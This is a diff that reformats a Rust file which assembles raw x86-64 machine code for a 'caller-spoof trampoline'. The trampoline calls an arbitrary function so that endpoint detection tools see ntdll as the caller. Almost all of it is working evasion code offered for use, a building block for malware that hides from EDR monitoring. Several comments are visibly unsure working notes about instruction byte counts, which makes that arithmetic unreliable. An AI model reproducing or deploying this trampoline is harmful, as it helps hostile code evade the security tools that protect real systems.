@@ -21,7 +21,10 @@ use crate::heap::Vec;
 
 pub const THUNK_MAX: usize = 256;
 
-pub struct Thunk { pub bytes: Vec<u8>, pub len: usize }
+pub struct Thunk {
+    pub bytes: Vec<u8>,
+    pub len: usize,
+}
 
 /// Build a caller-spoof trampoline.
 ///
@@ -31,14 +34,7 @@ pub struct Thunk { pub bytes: Vec<u8>, pub len: usize }
 ///
 /// Returns a Thunk that, when called as `extern "system" fn() -> usize`,
 /// invokes `target(a1,a2,a3,a4)` with the EDR seeing ntdll as the caller.
-pub fn build(
-    stub_addr: usize,
-    target: usize,
-    a1: usize,
-    a2: usize,
-    a3: usize,
-    a4: usize,
-) -> Thunk {
+pub fn build(stub_addr: usize, target: usize, a1: usize, a2: usize, a3: usize, a4: usize) -> Thunk {
     let mut b = Vec::with_capacity(THUNK_MAX);
 
     // === Data block (24 bytes at offset 0x00) ===
@@ -56,7 +52,9 @@ pub fn build(
     let data_rel: i32 = -(0x18i32 + 7i32);
 
     // lea r10, [rip + data_rel]   ; r10 = &data[0]
-    b.push(0x4C); b.push(0x8D); b.push(0x15);
+    b.push(0x4C);
+    b.push(0x8D);
+    b.push(0x15);
     b.extend(&data_rel.to_le_bytes());
 
     // Save non-volatile registers (System V / Microsoft both require these).
@@ -64,40 +62,56 @@ pub fn build(
     b.push(0x55); // push rbp
     b.push(0x57); // push rdi
     b.push(0x56); // push rsi
-    b.push(0x41); b.push(0x54); // push r12
-    b.push(0x41); b.push(0x55); // push r13
-    b.push(0x41); b.push(0x56); // push r14
-    b.push(0x41); b.push(0x57); // push r15
+    b.push(0x41);
+    b.push(0x54); // push r12
+    b.push(0x41);
+    b.push(0x55); // push r13
+    b.push(0x41);
+    b.push(0x56); // push r14
+    b.push(0x41);
+    b.push(0x57); // push r15
 
     // Set up args. For syscall-style functions: rcx, rdx, r8, r9.
     // We use rax as scratch for loading args.
 
     // mov rcx, a1
     if a1 == 0 {
-        b.push(0x48); b.push(0x31); b.push(0xC9); // xor ecx, ecx
+        b.push(0x48);
+        b.push(0x31);
+        b.push(0xC9); // xor ecx, ecx
     } else {
-        b.push(0x48); b.push(0xB9); // mov rcx, imm64
+        b.push(0x48);
+        b.push(0xB9); // mov rcx, imm64
         b.extend(&(a1 as u64).to_le_bytes());
     }
     // mov rdx, a2
     if a2 == 0 {
-        b.push(0x48); b.push(0x31); b.push(0xD2); // xor edx, edx
+        b.push(0x48);
+        b.push(0x31);
+        b.push(0xD2); // xor edx, edx
     } else {
-        b.push(0x48); b.push(0xBA); // mov rdx, imm64
+        b.push(0x48);
+        b.push(0xBA); // mov rdx, imm64
         b.extend(&(a2 as u64).to_le_bytes());
     }
     // mov r8, a3
     if a3 == 0 {
-        b.push(0x4D); b.push(0x31); b.push(0xC0); // xor r8, r8
+        b.push(0x4D);
+        b.push(0x31);
+        b.push(0xC0); // xor r8, r8
     } else {
-        b.push(0x49); b.push(0xB8); // mov r8, imm64
+        b.push(0x49);
+        b.push(0xB8); // mov r8, imm64
         b.extend(&(a3 as u64).to_le_bytes());
     }
     // mov r9, a4
     if a4 == 0 {
-        b.push(0x4D); b.push(0x31); b.push(0xC9); // xor r9, r9
+        b.push(0x4D);
+        b.push(0x31);
+        b.push(0xC9); // xor r9, r9
     } else {
-        b.push(0x49); b.push(0xB9); // mov r9, imm64
+        b.push(0x49);
+        b.push(0xB9); // mov r9, imm64
         b.extend(&(a4 as u64).to_le_bytes());
     }
 
@@ -105,7 +119,11 @@ pub fn build(
     // We use call/pop: call +0; pop rax; add rax, offset_to_resume
     // call $+5 (E8 00 00 00 00) — pushes return address, then execution
     // falls through to the next instruction.
-    b.push(0xE8); b.push(0x00); b.push(0x00); b.push(0x00); b.push(0x00);
+    b.push(0xE8);
+    b.push(0x00);
+    b.push(0x00);
+    b.push(0x00);
+    b.push(0x00);
 
     // RIP is now at the instruction after the call (= pop rax).
     // pop rax → rax = address of this pop instruction
@@ -117,7 +135,7 @@ pub fn build(
     // Wait, let me count more carefully:
     //   After pop rax:
     //   push rax                  = 1 byte  (50)
-    //   push qword [r10+0x00]     = 3 bytes (41 FF 72 00) — no, [r10] is 41 FF 32 = 3 bytes? 
+    //   push qword [r10+0x00]     = 3 bytes (41 FF 72 00) — no, [r10] is 41 FF 32 = 3 bytes?
     //   Actually: FF 32 = push [rdx]. For r10: 41 FF 32 = push [r10]
     //   Wait: 41 FF 32 = push QWORD PTR [r10] — 3 bytes
     //   Then: mov rax, [r10+0x08] = 4 bytes: 49 8B 42 08 (mov rax, [r10+8])  → wait, that's wrong.
@@ -135,7 +153,9 @@ pub fn build(
     let offset_to_resume: u8 = 10; // 1 + 3 + 4 + 2
 
     // add rax, offset_to_resume
-    b.push(0x48); b.push(0x83); b.push(0xC0); // add rax, imm8
+    b.push(0x48);
+    b.push(0x83);
+    b.push(0xC0); // add rax, imm8
     b.push(offset_to_resume);
 
     // rax now = address of the `resume` label below.
@@ -143,20 +163,30 @@ pub fn build(
     b.push(0x50); // push rax
 
     // Push fake_ret = [r10+0x00] (ntdll RET stub address).
-    b.push(0x41); b.push(0xFF); b.push(0x32); // push qword [r10]
+    b.push(0x41);
+    b.push(0xFF);
+    b.push(0x32); // push qword [r10]
 
     // Load target = [r10+0x08] into rax.
-    b.push(0x49); b.push(0x8B); b.push(0x42); b.push(0x08); // mov rax, [r10+8]
+    b.push(0x49);
+    b.push(0x8B);
+    b.push(0x42);
+    b.push(0x08); // mov rax, [r10+8]
 
     // jmp rax → target(a1,a2,a3,a4)
-    b.push(0xFF); b.push(0xE0);
+    b.push(0xFF);
+    b.push(0xE0);
 
     // === resume (reached after callee RET → ntdll RET) ===
     // Restore non-volatile registers in reverse order.
-    b.push(0x41); b.push(0x5F); // pop r15
-    b.push(0x41); b.push(0x5E); // pop r14
-    b.push(0x41); b.push(0x5D); // pop r13
-    b.push(0x41); b.push(0x5C); // pop r12
+    b.push(0x41);
+    b.push(0x5F); // pop r15
+    b.push(0x41);
+    b.push(0x5E); // pop r14
+    b.push(0x41);
+    b.push(0x5D); // pop r13
+    b.push(0x41);
+    b.push(0x5C); // pop r12
     b.push(0x5E); // pop rsi
     b.push(0x5F); // pop rdi
     b.push(0x5D); // pop rbp
